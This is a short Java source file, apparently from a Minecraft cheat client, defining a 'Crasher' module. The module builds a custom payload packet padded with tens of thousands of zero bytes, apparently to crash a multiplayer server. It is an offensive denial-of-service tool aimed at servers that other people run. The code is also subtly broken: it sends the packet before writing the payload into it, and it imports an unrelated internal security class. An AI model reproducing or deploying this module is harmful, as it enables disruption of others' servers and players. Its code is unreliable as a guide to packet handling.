package me.constantindev.nebula.Modules;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufAllocator;
import io.netty.buffer.ByteBufUtil;
import me.constantindev.nebula.etc.ModuleBase;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.RunArgs;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import sun.security.pkcs11.Secmod;

import java.io.IOException;

public class CrasherTest extends ModuleBase {
    public CrasherTest() {
        super("Crasher","Bruh");
    }

    @Override
    public void run() {
        ByteBuf f = ByteBufUtil.writeUtf8(ByteBufAllocator.DEFAULT,"0");
        //
        for(int i = 0;i<32767;i++) ByteBufUtil.writeMediumBE(f,0x00);
        CustomPayloadC2SPacket p = new CustomPayloadC2SPacket();
        MinecraftClient.getInstance().player.world.sendPacket(p);
        try {
            p.write(new PacketByteBuf(f));
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        super.run();
    }
}
